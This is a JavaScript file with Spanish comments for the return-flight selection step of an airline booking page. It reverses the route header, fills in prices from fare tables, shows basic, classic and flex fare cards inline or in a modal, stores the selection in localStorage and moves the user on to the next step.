/**
 * REGRESO — igual visual que ida. Mantiene tus precios y datasets.
 * Inline ON (despliegue suave bajo la card), con modal de respaldo.
 */

const INLINE_FARES = true;
let _lastClickedCard = null;

/* ===== Loader básico ===== */
const modal = document.querySelector('#modal-select-ticket');
const loader = document.querySelector('.loader');
setTimeout(() =>{
  try{
    document.body.classList.remove('sb-hidden');
    document.body.classList.remove('sb2-hidden');
    loader.classList.remove('show');
  }catch(e){ console.log(e); }
}, 2500);

/* ===== Header (REGRESO invierte ruta) ===== */
(function setHeader(){
  const o = info.flightInfo.origin;
  const d = info.flightInfo.destination;
  const dateBack = info.flightInfo.flightDates[1] || info.flightInfo.flightDates[0];

  document.querySelector('#origin-code').textContent      = d.code;
  document.querySelector('#destination-code').textContent = o.code;
  document.querySelector('#flight-date').textContent      = monthDic[+dateBack.split('-')[1]-1] + ' ' + dateBack.split('-')[2];
  document.querySelector('#flight-label-1').textContent   = `Selecciona tu vuelo de regreso - ${formatDateType1(dateBack)}`;
  document.querySelector('#flight-label-2').textContent   = `${d.city} a ${o.city}`;
  document.querySelector('#flight-label-3').textContent   = `${formatDateType1(dateBack)}`;
})();

/* ===== Relleno de precios "Desde" ===== */
(function fillPrices(){
  const isNAC = (info.flightInfo.origin.country === 'Ecuador' && info.flightInfo.destination.country === 'Ecuador');
  const P = isNAC ? pricesNAC : pricesINT;

  const map = [
    ['#flight-price-0', 'flight_1'],
    ['#flight-price-1', 'flight_1'],
    ['#flight-price-2', 'flight_2'],
    ['#flight-price-3', 'flight_3'],
    ['#flight-price-4', 'flight_4'],
    ['#flight-price-5', 'flight_5'],
    ['#flight-price-6', 'flight_6'],
    ['#flight-price-7', 'flight_7'],
    ['#flight-price-8', 'flight_8'],
    ['#flight-price-9', 'flight_9'],
    ['#flight-price-10','flight_10'],
  ];

  map.forEach(([sel, key])=>{
    const el = document.querySelector(sel);
    if (el && P[key]) el.textContent = formatPrice(P[key].xs);
  });
})();

/* ===== Editar vuelo ===== */
const btnEditFlight = document.querySelector('#btn-edit-flight');
btnEditFlight && btnEditFlight.addEventListener('click', ()=>{
  info.edit = 1; updateLS(); window.location.href = 'index.html';
});

/* ===== Utilidades ===== */
function updateLS(){ LS.setItem('info', JSON.stringify(info)); }
function formatDateType1(date){
  const dt = new Date(+date.split('-')[0], +date.split('-')[1]-1, +date.split('-')[2]-1);
  return dayDic[dt.getDay()] + ', ' + monthDic[dt.getMonth()] + ' ' + date.split('-')[2];
}
function formatPrice(n){ return Number(n).toLocaleString('en', { maximumFractionDigits: 2 }); }

/* ===== TRACK CARD CLIC ===== */
document.addEventListener('click', (e)=>{
  const c = e.target.closest('.av-card, .card-departure');
  if (c) _lastClickedCard = c;
}, true);

/* ===== Cerrar inline al click fuera ===== */
document.addEventListener('click', (e)=>{
  const insidePanel = e.target.closest('.av-inline-fares');
  const insideCard  = e.target.closest('.av-card, .card-departure');
  if (!insidePanel && !insideCard){
    document.querySelectorAll('.av-inline-fares').forEach(p => p.remove());
  }
});

/* ===== loadFlight: inline como en ida, modal fallback ===== */
function loadFlight(flight_sched){
  // guardar selección de regreso
  info.flightInfo.ticket_sched_back = flight_sched;
  info.flightInfo.ticket_nat = (info.flightInfo.origin.country === 'Ecuador' && info.flightInfo.destination.country === 'Ecuador') ? 'NAC' : 'INT';
  updateLS();

  if (INLINE_FARES){
    const card = getCard(flight_sched);
    // toggle si ya está abierto en la misma card
    if (card && card.nextElementSibling && card.nextElementSibling.classList.contains('av-inline-fares')){
      card.nextElementSibling.remove();
      return;
    }
    // cerrar otros
    document.querySelectorAll('.av-inline-fares').forEach(p => p.remove());
    renderInlineFares(flight_sched, card);
    return;
  }

  // fallback modal
  try{ modal.classList.add('show'); }catch(e){ console.log(e); }
  setModalPrices(flight_sched);
}

function getCard(flight_sched){
  if (_lastClickedCard && _lastClickedCard.matches('.av-card, .card-departure')) return _lastClickedCard;
  const all = Array.from(document.querySelectorAll('.av-card[onclick], .card-departure[onclick]'));
  return all.find(el => (el.getAttribute('onclick')||'').includes(flight_sched)) || all[0];
}

function setModalPrices(flight_sched){
  const P = (info.flightInfo.ticket_nat === 'NAC') ? pricesNAC : pricesINT;
  const F = P[flight_sched]; if (!F) return;
  const xs = document.querySelector('#xs');
  const s  = document.querySelector('#s');
  const m  = document.querySelector('#m');
  if (xs && s && m){
    xs.textContent = formatPrice(F.xs);
    s.textContent  = formatPrice(F.s);
    m.textContent  = formatPrice(F.m);
  }
}

/* ===== Render inline fares (idéntico look al ida) ===== */
function renderInlineFares(flight_sched, card){
  const P = (info.flightInfo.ticket_nat === 'NAC') ? pricesNAC : pricesINT;
  const F = P[flight_sched]; if (!F || !card) return;

  const html = `
    <div class="av-inline-fares" data-flight="${flight_sched}">
      <div class="av-inline-fares__top">
        <h3 class="av-choose-title">Elige cómo quieres volar (regreso)</h3>
        <button class="av-inline-close" type="button">Cerrar</button>
      </div>
      <div class="av-fares-grid">
        <div class="card-container xs">
          <div class="card-ticket">
            <h2 class="card-ticket-type">basic</h2>
            <p class="card-ticket-label">Vuela ligero</p>
            <div class="card-ticket-items">
              <div class="ct-item"><img src="./assets/svg/personalItemLowest-XS.svg" width="18"><p>1 artículo personal (bolso)</p></div>
              <div class="ct-item" style="text-decoration: underline;"><img src="./assets/svg/icon-alert-denied.svg" width="18"><p>Restricciones de la tarifa</p></div>
            </div>
          </div>
          <div class="card-ticket-header" data-next="xs">
            <h6 class="fs-3">$${formatPrice(F.xs)}</h6>
            <p class="fs-5">Precio por pasajero</p>
          </div>
        </div>

        <div class="card-container s">
          <div class="card-ticket">
            <h2 class="card-ticket-type">classic</h2>
            <p class="card-ticket-label">Más completo</p>
            <div class="card-ticket-items">
              <div class="ct-item"><img src="./assets/svg/S_1.svg" width="18"><p>1 artículo personal (bolso)</p></div>
              <div class="ct-item"><img src="./assets/svg/S_2.svg" width="18"><p>1 equipaje de mano (10kg)</p></div>
              <div class="ct-item"><img src="./assets/svg/S_3.svg" width="18"><p>1 equipaje de bodega (23kg)</p></div>
              <div class="ct-item"><img src="./assets/svg/S_4.svg" width="18"><p>Check-in en aeropuerto</p></div>
              <div class="ct-item"><img src="./assets/svg/S_5.svg" width="18"><p>Asiento Economy</p></div>
              <div class="ct-item"><img src="./assets/svg/S_6.svg" width="18"><p>Acumula lifemiles</p></div>
              <div class="ct-item" style="text-decoration: underline;"><img src="./assets/svg/icon-alert-denied.svg" width="18"><p>Restricciones de la tarifa</p></div>
            </div>
          </div>
          <div class="card-ticket-header" data-next="s">
            <h6 class="fs-3">$${formatPrice(F.s)}</h6>
            <p class="fs-5">Precio por pasajero</p>
          </div>
        </div>

        <div class="card-container m">
          <div class="card-ticket">
            <h2 class="card-ticket-type">flex</h2>
            <p class="card-ticket-label">Más posibilidades</p>
            <div class="card-ticket-items">
              <div class="ct-item"><img src="./assets/svg/M_1.svg" width="18"><p>1 artículo personal (bolso)</p></div>
              <div class="ct-item"><img src="./assets/svg/M_2.svg" width="18"><p>1 equipaje de mano (10kg)</p></div>
              <div class="ct-item"><img src="./assets/svg/M_3.svg" width="18"><p>1 equipaje de bodega (23kg)</p></div>
              <div class="ct-item"><img src="./assets/svg/M_4.svg" width="18"><p>Check-in en aeropuerto</p></div>
              <div class="ct-item"><img src="./assets/svg/M_5.svg" width="18"><p>Asiento Economy</p></div>
              <div class="ct-item"><img src="./assets/svg/M_6.svg" width="18"><p>Acumula lifemiles</p></div>
              <div class="ct-item"><img src="./assets/svg/M_7.svg" width="18"><p>Reembolso</p></div>
              <div class="ct-item"><img src="./assets/svg/M_8.svg" width="18"><p>Cambios de vuelo</p></div>
              <div class="ct-item" style="text-decoration: underline;"><img src="./assets/svg/icon-alert-denied.svg" width="18"><p>Restricciones de la tarifa</p></div>
            </div>
          </div>
          <div class="card-ticket-header" data-next="m">
            <h6 class="fs-3">$${formatPrice(F.m)}</h6>
            <p class="fs-5">Precio por pasajero</p>
          </div>
        </div>
      </div>
    </div>
  `;
  card.insertAdjacentHTML('afterend', html);

  const panel = card.nextElementSibling;
  const btnClose = panel.querySelector('.av-inline-close');
  btnClose && btnClose.addEventListener('click', ()=> panel.remove());

  panel.addEventListener('click', (e)=>{
    const btn = e.target.closest('.card-ticket-header');
    if (!btn) return;
    nextStepBack(btn.dataset.next);
  });

  panel.scrollIntoView({ behavior:'smooth', block:'start' });
}

/* ===== Navegación siguiente (regreso) ===== */
function nextStepBack(type){
  info.flightInfo.ticket_type_back = type;
  updateLS();
  window.location.href = 'step-two.html';
}

/* ===== Compat: modal viejo ===== */
const closeModalTicket = document.querySelector('#modal-close-ticket');
closeModalTicket && closeModalTicket.addEventListener('click', ()=> modal.classList.remove('show'));
function nextStep(type){ // si alguien usa el modal
  info.flightInfo.ticket_type_back = type; updateLS(); window.location.href = 'step-two.html';
}
